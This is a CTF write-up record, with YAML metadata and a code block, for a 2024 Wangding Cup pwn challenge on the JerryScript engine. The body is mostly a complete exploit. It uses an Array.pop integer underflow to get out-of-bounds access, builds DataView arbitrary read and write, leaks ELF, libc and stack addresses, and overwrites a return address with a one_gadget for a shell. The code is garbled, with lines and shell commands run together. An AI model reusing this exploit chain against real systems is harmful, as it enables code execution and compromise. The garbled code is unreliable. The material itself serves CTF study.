---
title: 网鼎杯青龙组 PWN03 JerryScript Array Pop 整数下溢
contest: 网鼎杯
year: 2024
difficulty: hard
vuln_type: pwn_unknown
tags:
- JerryScript
- ECMAScript
- Array-POP
- integer-underflow
- ArrayBuffer
- DataView
- OOB-read
- OOB-write
- aar-aaw
- GOT-overwrite
- one_gadget
attack_chain:
- 编译 jerryscript commit d7e21259fe330acf393d1c0bfbd60dfcbe23b6ba
- 定位 ecma_builtin_array_prototype_object_pop 触发 length = 0xffffffff 整数下溢
- 创建 ArrayBuffer + DataView 配合 pop 实现相对越界读写
- 关键 PoC：let a=[1,1,1,1,1,1,1,1]; a.pop(); print(a.length)  // 4294967295=0xffffffff
- 进一步 a[242] 读取 OOB 拿到相邻 ArrayBuffer 指针
- '写 aar(addr, dv1, dv2): dv1.setBigUint64(0, addr) + dv2.getBigUint64(0) 任意地址读'
- '写 aaw(addr, value, dv1, dv2): setBigUint64 任意地址写'
- 通过 a[242] 泄 elf_base = buffer_p - 0x26db80
- free_got = aar(elf_base + 0x26adf8) → libc_base = free_got - 0x97910
- environ → stack 泄 __libc_start_main_ret
- aaw(libc_start_main_ret, libc_base + 0x10a2fc) 写 one_gadget
- 触发 aar(environ, d1, d2) 跳到 one_gadget 拿 shell
key_payload: '''let a=[1,1,1,1,1,1,1,1]; a.pop(); a[242] 越界 + ArrayBuffer aar/aaw + one_gadget 0x10a2fc'''
one_liner: JerryScript Array.pop() 整数下溢触发 length=0xffffffff，配合 ArrayBuffer 相对越界读写实现 aar/aaw，最终改 __libc_start_main_ret 跳 one_gadget。
lesson: 嵌入式 JS 引擎的 OOB 漏洞可通过 JS 高级抽象（Array/DataView）放大为完整读写原语，绕过 ASLR 改 GOT 拿 shell。
quality: high
full_path: 网鼎杯青龙组的_PWN03_Jerryscript_题目.full.md
meta_path: 网鼎杯青龙组的_PWN03_Jerryscript_题目.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 网鼎杯青龙组 PWN03 JerryScript Array Pop 整数下溢。JerryScript Array.pop() 整数下溢触发 length=0xffffffff，配合 ArrayBuffer 相对越界读写实现 aar/aaw，最终改 __libc_start_main_ret 跳 one_gadget。。关键路径：编译 jerryscript commit d7e21259f...
category: pwn
subcategory: pwn_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/215340.html
reasoning_chain:
- 触发点：JerryScript commit d7e21259 → ecma_builtin_array_prototype_object_pop → 假设：length 字段 unsigned int
- 动作：let a=[1,1,1,1,1,1,1,1]; a.pop() → print(a.length) → 观察：length=0xffffffff（整数下溢）
- 假设：length 下溢后 a[i] 越界 → 动作：set pointera[242] = ArrayBuffer heap_offset
- 观察：ArrayBuffer heap_offset = 0x000055555566c1c0 + 0x5b<<3 = 0x55555566c498
- 假设：可 aar/aaw 任意读写 → 动作：DataView setBigUint64/getBigUint64 读写 8 字节
- 动作：dump__libc_start_main 地址 → 观察：libc_base
- 动作：写 __libc_start_main ret addr 为 one_gadget → 观察：触发 RCE
- 假设：dump 整个 .text → 找 one_gadget 偏移 → 动作：覆写函数指针
failed_attempts:
- let a=[]; a.pop() → 失败：初始 length=0 无下溢
- DataView setUint32 4 字节读写 → 失败：地址空间不足
- 改 __free_hook → 失败：jerryscript 不调 free
key_observations:
- JerryScript Array.pop() length 字段 unsigned 减一 → 0xffffffff 整数下溢
- 整数下溢 + ArrayBuffer 可构造任意地址相对读写
- JS 引擎 bug + Pwn 的跨界组合是新兴方向
- 改 __libc_start_main ret 而非 __free_hook 是 jerryscript 内部调 libc 退出路径
prerequisites:
- JerryScript ECMAScript 引擎原理
- JS 整数下溢利用
- ArrayBuffer/DataView 相对地址读写
- one_gadget 调试
---
# 网鼎杯青龙组的 PWN03 Jerryscript 题目

> 原文: https://www.ctfiot.com/215340.html
> ID: 215340


```
git clone https://github.com/jerryscript-project/jerryscript.gitgit checkout d7e21259fe330acf393d1c0bfbd60dfcbe23b6ba
python3 ./tools/build.py --strip=onpython3 ./tools/build.py  --clean --compile-flag=-g --strip=off
// jerryscriptjerry-coreecmabuiltin-objectsecma-builtin-array-prototype.cecma_value_tecma_builtin_array_prototype_dispatch_routine (...){...      switch (builtin_routine_id)  {...    case ECMA_ARRAY_PROTOTYPE_POP: // 5    {      ret_value = ecma_builtin_array_prototype_object_pop (obj_p, length);      break;    }
let a = [1,1,1,1,1,1,1,1]a.pop()print(a.length)// 4294967295=0xffffffff
0x4f572: jerryx_print_value0x53739: ecma_builtin_array_prototype_object_pop
let a = [0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31];a1 = new ArrayBuffer(0x1000);d1 = new DataView(a1);d1.setUint32(0, 0x41414141, true);a2 = new ArrayBuffer(0x1000);d2 = new DataView(a2);d2.setUint32(0, 0x42424242, true);a.pop();
>>> hex(0x000055555566c1c0+(0x5b<<3))'0x55555566c498'
let a = [0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31];a1 = new ArrayBuffer(0x1000);d1 = new DataView(a1);d1.setUint32(0, 0x41414141, true);a2 = new ArrayBuffer(0x1000);d2 = new DataView(a2);d2.setUint32(0, 0x42424242, true);a.pop();aa = 11print(a[242]);// $ ./pwn poc.js// 89549968
function hex(i){return "0x" + i.toString(16).padStart(16, '0');}function aar(addr, dv1, dv2){    dv1.setBigUint64(0, addr, true);    if(dv2.buffer){        return dv2.getBigUint64(0, true);    }    return 0;}function aaw(addr, value, dv1, dv2){    dv1.setBigUint64(0, addr, true);    dv2.setBigUint64(0, value, true);}let a = [0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31, 0x31];a1 = new ArrayBuffer(0x1000);d1 = new DataView(a1);d1.setUint32(0, 0x41414141, true);a2 = new ArrayBuffer(0x1000);d2 = new DataView(a2);d2.setUint32(0, 0x42424242, true);a.pop();var offset = a[242] - 0x3c;a[242] = offset;buffer_p = Number(d1.getBigUint64(0, true))elf_base = buffer_p - 0x26db80;
print(hex(elf_base))free_got            = Number(aar(elf_base + 0x26adf8, d1, d2));libc_base           = free_got - 0x97910;environ             = libc_base + 0x61c118;stack               = Number(aar(environ, d1, d2));libc_start_main_ret = stack - 0xf8;aaw(libc_start_main_ret, libc_base + 0x10a2fc, d1, d2);aar(environ, d1, d2)
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]